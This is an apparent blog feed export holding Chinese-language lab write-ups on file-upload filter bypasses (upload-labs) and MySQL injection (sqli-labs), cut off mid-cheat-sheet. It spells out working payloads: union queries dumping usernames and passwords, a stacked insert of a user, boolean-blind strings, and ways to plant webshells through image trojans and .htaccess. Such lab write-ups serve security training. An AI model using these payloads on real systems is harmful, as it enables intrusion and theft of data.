      <url>/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><ul><li>文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。</li><li>如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。</li></ul><h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><ul><li>文件上传漏洞是指用户通过界面上的上传功能上传了一个可执行的脚本文件，而WEB端的系统并未对其进行检测或者检测的逻辑做的不够好。</li><li>通常来说文件上传功能是没有问题的，主要是服务器如何对上传的文件如何进行处理。</li><li>若WEB未对用户上传的文件进行有效的审查，若存在恶意用户对其上传一句话木马，从而实现控制WEB网站的目的。</li></ul><h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><ul><li>Webshell是一种网页后门，通常用asp、jsp或者php编写。</li><li>WebShell的常见的功能有执行系统命令、窃取用户数据、删除web页面、修改主页等。黑客在入侵了一个网站后，常常在将这些asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。</li></ul><h2 id="Webshell的分类"><a href="#Webshell的分类" class="headerlink" title="Webshell的分类"></a>Webshell的分类</h2><table><thead><tr><th><strong>分类</strong></th><th><strong>体量</strong></th><th><strong>特点</strong></th></tr></thead><tbody><tr><td>大马</td><td>体积大，包含很多功能</td><td>通常会包含调用系统的关键函数，所以通常会加密代码用来隐藏。</td></tr><tr><td>小马</td><td>体积小，通常只包含文件上传功能</td><td>同上</td></tr><tr><td>一句话木马</td><td>代码极短（只有一行）</td><td>使用方便，可以单独作为一个文件，也可以插入其他正常文件中；变形多，难以查杀。</td></tr></tbody></table><h1 id="文件上传实战思路"><a href="#文件上传实战思路" class="headerlink" title="文件上传实战思路"></a>文件上传实战思路</h1><ul><li>文件上传和文件执行是两个东西</li><li>漏洞分类：解析漏洞、cms漏洞、其他漏洞（编辑器漏洞、cve漏洞、安全修复）</li><li>思路：如果有一个网站，要从文件上传的方向开始</li><li>第一步：先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;</li><li>如果有，如何找：</li><li>字典扫描：扫描会员中心，文件上传的位置</li><li>找到后，如何利用：</li><li>验证&#x2F;绕过</li></ul><h1 id="文件上传绕过分类"><a href="#文件上传绕过分类" class="headerlink" title="文件上传绕过分类"></a>文件上传绕过分类</h1><h2 id="JS类防护"><a href="#JS类防护" class="headerlink" title="JS类防护"></a>JS类防护</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>JS防护就是将上传的文件进行一个格式的验证，但是JS类的防护是用户可以控制的，所有前端的所有验证都是不安全的。</li></ul><h3 id="实例upload-labs-Pass01"><a href="#实例upload-labs-Pass01" class="headerlink" title="实例upload-labs-Pass01"></a>实例upload-labs-Pass01</h3><ul><li>通过禁用界面JS处理，可以禁用JS防护</li><li>在火狐安装插件javascript switcher，可以一键禁用JS处理<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225253.png" alt="image.png"></li><li>在upload下就可以看到我们上传的文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225334.png" alt="image.png"></li></ul><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul><li>黑名单就是服务端明确不让上传的格式后缀，例如：rar、php、zip等。</li></ul><h3 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>特殊解析后缀绕过是由于黑名单过滤规则不严谨，在某些特定的情况下的后缀也能够被当作php文件进行解析，例如PHP2、php3、php4、phtml、pht等情况。</li><li>可以使用phtml、php3、php4、php5，当然前提是apache服务器，同时在配置文件夹中需要有将AddType application&#x2F;x-httpd-php .php .phtml .phps .php1 .php4 .pht 这样的一段话前面的注释删除，重启phpstudy让其生效。</li></ul><h4 id="实例upload-labs-Pass03"><a href="#实例upload-labs-Pass03" class="headerlink" title="实例upload-labs-Pass03"></a>实例upload-labs-Pass03</h4><ul><li>禁止<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>类型进行上传</li><li>将php文件后缀改为phtml进行绕过，实现文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008230836.png" alt="image.png"></li></ul><h3 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置</li><li>通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li></ul><h4 id="实例upload-labs-Pass04"><a href="#实例upload-labs-Pass04" class="headerlink" title="实例upload-labs-Pass04"></a>实例upload-labs-Pass04</h4><ul><li>通过源码得知第三关使用的phtml被限制了，并且设定了更多的特殊解析后缀，所以使用特殊解析后缀已经无法绕过了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008231355.png" alt="image.png"></li><li>这里就可以使用到<code> .htaccess</code>进行绕过测试。</li><li>创建一个 <code>.htaccess</code>文件，使用notepad++编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008232814.png" alt="image.png"></li><li>然后将<code>.htaccess</code>文件上传，再将php文件改为<code>.jpg</code>文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104431.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104445.png" alt="image.png"></li><li>可以看到已经成功上传文件了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104909.png" alt="image.png"></li></ul><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>后缀大小写是通过服务端未将后缀进行统一的格式转换，导致可以上传PHP的文件，同时由于Windows系统对后缀大小写并不敏感，所以当在写PHP的改成Php就会被当作PHP进行解析。</li></ul><h4 id="实例upload-labs-Pass05"><a href="#实例upload-labs-Pass05" class="headerlink" title="实例upload-labs-Pass05"></a>实例upload-labs-Pass05</h4><ul><li>通过源码可知，其未对大小写进行限制，我们可以对php后缀进行大小写变形<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105223.png" alt="image.png"></li><li>上传文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105402.png" alt="image.png"></li></ul><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><h4 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>点绕过其实就是利用了Windows对文件和文件名的限制，当将点放在结尾的时候，就会触发操作系统的命名规范问题，所以在生成文件的时候，添加在结尾的点就会被去除。</li></ul><h4 id="实例upload-labs-Pass07"><a href="#实例upload-labs-Pass07" class="headerlink" title="实例upload-labs-Pass07"></a>实例upload-labs-Pass07</h4><ul><li>通过源码发现，本关并未对结尾点进行检测。</li><li>那么这里就可以通过在后缀加上点进行绕过，触发操作系统的命名规范，就会将结尾的点去除<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111050.png" alt="image.png"></li><li>burp抓包在结尾加个点就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111203.png" alt="image.png"></li><li>可以看见成功上传了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111305.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass09"><a href="#实例upload-labs-Pass09" class="headerlink" title="实例upload-labs-Pass09"></a>实例upload-labs-Pass09</h4><ul><li>通过源码发现，加一个点会被过滤</li><li>但是只是过滤一次，所有可以加两个点<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111429.png" alt="image.png"></li><li>只需要与Pass07相同的方法，结尾加两个点即可</li></ul><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>其实空格绕过和点绕过是一样的，都是利用操作系统的特性来进行解析绕过。</li></ul><h4 id="实例upload-labs-Pass06"><a href="#实例upload-labs-Pass06" class="headerlink" title="实例upload-labs-Pass06"></a>实例upload-labs-Pass06</h4><ul><li>通过源码发现，没有对结尾空格进行限制，所有我们可以在结尾加空格进行绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111938.png" alt="image.png"></li><li>成功绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112000.png" alt="image.png"></li></ul><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><h4 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</li></ul><h4 id="实例upload-labs-Pass08"><a href="#实例upload-labs-Pass08" class="headerlink" title="实例upload-labs-Pass08"></a>实例upload-labs-Pass08</h4><ul><li>通过源码可知，没有为<code>::$DATA</code>的检测<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112905.png" alt="image.png"></li><li>在文件结尾加<code>::$DATA</code>就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113123.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113158.png" alt="image.png"></li></ul><h3 id="双后缀名绕过"><a href="#双后缀名绕过" class="headerlink" title="双后缀名绕过"></a>双后缀名绕过</h3><h4 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端可能存在将后缀替换为空的情况，但是这就存在一种可能就是在编辑过滤的时候只过滤了一次，所以就出现了可以通过双写就绕过的可能。</li></ul><h4 id="实例upload-labs-Pass10"><a href="#实例upload-labs-Pass10" class="headerlink" title="实例upload-labs-Pass10"></a>实例upload-labs-Pass10</h4><ul><li>通过源码可以知道，上传指定的文件后缀，会被替换成空，但是只替换一次<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150200.png" alt="image.png"></li><li>那么就可以通过双后缀的方式绕过</li><li>由于过滤是从左往右，例如p<strong>php</strong>hp会被过滤成php<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150658.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150752.png" alt="image.png"></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li>白名单就是服务端明确可以上传的格式后缀，例如：jpg、png、jpeg等。</li></ul><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。</li><li>利用Burp抓包，将报文中的Content-Type改成允许的类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif（gif图像）</span><br><span class="line">Content-Type: image/jpg（jpg图像）</span><br><span class="line">Content-Type: image/png（png图像）</span><br></pre></td></tr></table></figure></li></ul><h4 id="实例upload-labs-Pass02"><a href="#实例upload-labs-Pass02" class="headerlink" title="实例upload-labs-Pass02"></a>实例upload-labs-Pass02</h4><ul><li>通过源码可知，采用了<code>content-type</code>进行后端验证<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009151320.png" alt="image.png"></li><li>我们可以通过burp抓包对其<code>content-type</code>进行修改<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152042.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152057.png" alt="image.png"></li></ul><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="基本概念-9"><a href="#基本概念-9" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>%00不是代表空格，而是null，一个空字符，当程序执行到%00后，那么后面的数据就会停止，意思就是误当作结束符，把后面的数据直接忽略了，这就会导致漏洞产生。</li><li>在文件上传后，利用%00截断，在文件扩展名验证的时候，就会取文件的扩展名进行验证，但是在最后保存在本地的时候，%00就会截断文件名，只保存%00之前的内容。</li><li>%00只能用于php版本低于5.3的。这里我们需要把phpstudy切换一下版本,把magic_quotes_gpc关闭，以phpstudy为例。其他选项菜单—php扩展及设置—参数开关设置—把magic_quotes_gpc关闭。</li></ul><h2 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h2><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><h4 id="基本概念-10"><a href="#基本概念-10" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>图片的格式在防护中通常是不会使用后缀进行判断的依据，文件头是文件开头的一段二进制码，不同类型的图片也就会有不同的二进制头。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E1  </span><br><span class="line">PNG (png)，文件头：89 50 4E 47  </span><br><span class="line">GIF (gif)，文件头：47 49 46 38</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153123.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass13"><a href="#实例upload-labs-Pass13" class="headerlink" title="实例upload-labs-Pass13"></a>实例upload-labs-Pass13</h4><ul><li>制作木马图</li><li>在创建一个图片，和php文件，使用指令<code>copy 1.png/b + p13.php/a 2.png</code>进行合并<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153856.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153909.png" alt="image.png"></li><li>上传合并后的图片，这个图片当中就包含了php语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153956.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009155428.png" alt="image.png"></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><h4 id="基本概念-11"><a href="#基本概念-11" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>二次渲染就是在我们上传的图片后，网站会对图片进行二次处理，比如对图片的尺寸、格式、以及网站对图片进行定义的一些要求等进行处理，并且服务器会对里面的内容进行二次替换更新，在处理完后，会生成一个合规的图片在网站上显示出来。</li></ul><h4 id="实例upload-labs-Pass16"><a href="#实例upload-labs-Pass16" class="headerlink" title="实例upload-labs-Pass16"></a>实例upload-labs-Pass16</h4><ul><li>通过源码可知，会重新渲染图片，就是说我们上传的图片不会被保存，而是只有图片信息被提取</li><li>准备一个gif图片（最好是，因为比较容易），制作成图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220037.png" alt="image.png"></li><li>上传图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220114.png" alt="image.png"></li><li>将上传的图片马与后台保存的进行对比</li><li>使用<strong>Beyond Compare 4</strong>工具对比<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220244.png" alt="image.png"></li><li>发现图片文件前面大部分二次渲染的时候被过滤了，所以我们可以将php语句放在前部分，这样就不会被过滤了，然后保存<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220427.png" alt="image.png"></li><li>然后再将该文件进行上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220523.png" alt="image.png"></li><li>然后再次对比我们会发现，插入的php语句没有被过滤<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220856.png" alt="image.png"></li></ul><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><h4 id="基本概念-12"><a href="#基本概念-12" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>条件竞争就是在源代码中是存在校验的，但是校验是在文件上传后，才开始校验，也就是文件先上传至服务器中，然后服务器会对该文件进行校验，当符合的时候则会对文件进行重命名，当文件不符合要求的时候就对将文件进行删除。</li><li>而我们则需要在服务器对文件删除前进行访问，由于文件在访问过程中，服务器是无法删除的，所以就可以利用这个节点实现条件竞争。</li></ul><h3 id="突破getimagesize函数"><a href="#突破getimagesize函数" class="headerlink" title="突破getimagesize函数"></a>突破getimagesize函数</h3><h4 id="基本概念-13"><a href="#基本概念-13" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li><code>getimagesize</code>函数是用于获取图像大小及相关信息，成功返回一个数组，失败则返回false产生一条e_warning级的错误信息。</li><li>通过对图片及代码进行合成图片马，这个时候<code>getimagesize</code>函数既可以获取图片信息，文件后缀php也能够被解析成脚本文件，从而绕过<code>getimagesize</code>函数的限制。</li></ul><h4 id="实例upload-labs-Pass14"><a href="#实例upload-labs-Pass14" class="headerlink" title="实例upload-labs-Pass14"></a>实例upload-labs-Pass14</h4><ul><li>本关存有getimagesize函数，这个函数的意思是：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</li><li>使用办法和第十三关是一样的，前提都是需要存在相关的漏洞。</li></ul><h3 id="突破exit-imagetype-函数"><a href="#突破exit-imagetype-函数" class="headerlink" title="突破exit_imagetype()函数"></a>突破exit_imagetype()函数</h3><h4 id="基本概念-14"><a href="#基本概念-14" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务器exit_imagetype()函数检测上传图片类型是否为白名单图片格式来验证上传文件合法性。可以通过制作图片马绕过，再配合文件包含漏洞解析文件来获取服务器配置信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型（2）</title>
      <link href="/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/"/>
      <url>/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h1><ul><li>数据包当中的cookie内容经过了加密，可以将sql语句进行加密，然后注入</li><li>以sqli-labs-less21为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225650.png" alt="image.png"></li><li>在用户名密码栏当中输入admin<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225719.png" alt="image.png"></li><li>会回显我们的cookie数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225935.png" alt="image.png"></li><li>通过抓包工具可以看到cookie数据内容被加密了，加密方式为base64编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230631.png" alt="image.png"></li><li>解密得到admin原文，我们在后面加个单引号测试是否存在漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230916.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230938.png" alt="image.png"></li><li>可以看出，我们可以在后面加上单引号和后括号进行注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231807.png" alt="image.png"></li><li>将报错注入到cookie当中，然后进行加密<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231847.png" alt="image.png"></li><li>可以看到注入成功了</li></ul><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</li><li>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>在第一次进行数据库插入数据的时候，使用了<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，但是存入数据库时还是原来的数据，数据中带有<code>&#39;</code>或者<code>#</code>，然后下次使用再拼凑sql语句中，形成二次注入</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less24为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232516.png" alt="image.png"></li><li>我们没有用户名和密码，所有我们通过注册账户的方式，将干扰符号注入进去</li><li>我们猜测存在admin用户，所有我们注册admin’#<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232641.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232655.png" alt="image.png"></li><li>通过查询可以知道我们的账户注册成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232832.png" alt="image.png"></li><li>成功登录之后，进入到更改密码的界面，我们直接将密码改为<code>111111</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232929.png" alt="image.png"></li><li>此时我们发现，我们将<code>admin</code>的密码改了，说明二次注入成功</li><li>原因时代码在执行的过程中，将<code>&#39;#</code>进行了转义，没有对注册造成干扰，但是在第二次调用的时候没有进行过滤，造成二次注入。</li></ul><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>堆叠查询可以执行多条语句，多条语句之间以分号隔开。</li><li>堆叠注入就是利用在一条查询语句结束之后，在语句末尾加入分号之后再插入恶意的SQL语句，就可以达到攻击者的意图。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less38为例</li><li>在语句中加个分号<code>;</code>，在后面加入需要注入的恶意语句</li><li><code>?id=1&#39;; insert into users(id,username,password) values (38,&#39;less38&#39;,&#39;mima&#39;)--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234158.png" alt="image.png"></li><li>用于在数据库当中插入自定义的用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234356.png" alt="image.png"></li><li>可以看到已经注入成功了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型</title>
      <link href="/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><ul><li>联合注入，就是使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于<strong>有回显</strong>同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库<code>information_schema</code>，能很快的通过几条注入语句获取到想要的数据。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-1为例</li></ul><h3 id="查询表格的列数"><a href="#查询表格的列数" class="headerlink" title="查询表格的列数"></a>查询表格的列数</h3><ul><li><code>?id=2&#39; order by 3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224117.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224138.png" alt="image.png"></li><li>可以看出共有4列</li></ul><h3 id="爆出显示位"><a href="#爆出显示位" class="headerlink" title="爆出显示位"></a>爆出显示位</h3><ul><li><code>?id=-1&#39;union select 1,2,3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224250.png" alt="image.png"></li></ul><h3 id="获取当前数据库的数据库名和版本号"><a href="#获取当前数据库的数据库名和版本号" class="headerlink" title="获取当前数据库的数据库名和版本号"></a>获取当前数据库的数据库名和版本号</h3><ul><li><code>?id=-1&#39;union select 1,database(),version() --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224411.png" alt="image.png"></li></ul><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225123.png" alt="image.png"></li></ul><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><ul><li>?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225240.png" alt="image.png"></li></ul><h3 id="获取用户名和密码"><a href="#获取用户名和密码" class="headerlink" title="获取用户名和密码"></a>获取用户名和密码</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(username,password) from users --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225339.png" alt="image.png"></li></ul><h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><ul><li>如果没有回显，我们就不能使用联合注入了</li><li>这个时候可以选择布尔注入</li><li>布尔盲注主要用到<code>length()</code>,<code>ascii()</code> ,<code>substr()</code>这三个函数，首先通过<code>length()</code>函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说<strong>需要花费大量时间</strong>。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-5 为例</li></ul><h3 id="数据库名长度"><a href="#数据库名长度" class="headerlink" title="数据库名长度"></a>数据库名长度</h3><ul><li><code>?id=1&#39; and length((select database()))&gt;9--+</code>发现没有反应，表示长度小于或等于9<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230047.png" alt="image.png"></li><li><code>?id=1&#39; and length((select database()))=8--+</code>当等于8时，有通过反馈，表示数据库名长度为8<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230206.png" alt="image.png"></li></ul><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><ul><li><code>?id=1&#39;and ascii(substr((select database()),1,1))=115--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230349.png" alt="image.png"></li><li><code>substr(a,b,c)</code>a表示截取的字符串，b表示截取的位置，c表示截取的长度</li><li>一次截取一个字符进行查询，上面截图查询出第一个字符等于115，通过ASCII码可知为<code>s</code></li><li>通过这个方法查出全部八个字符</li><li>Ps:这个方法真的好麻烦哦</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>剩下的操作基本上差不多，可以参考下面的内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select database()))&gt;9--+</span></span><br><span class="line"><span class="string">#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select database()),1,1))=115--+</span><br><span class="line"><span class="comment">#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span 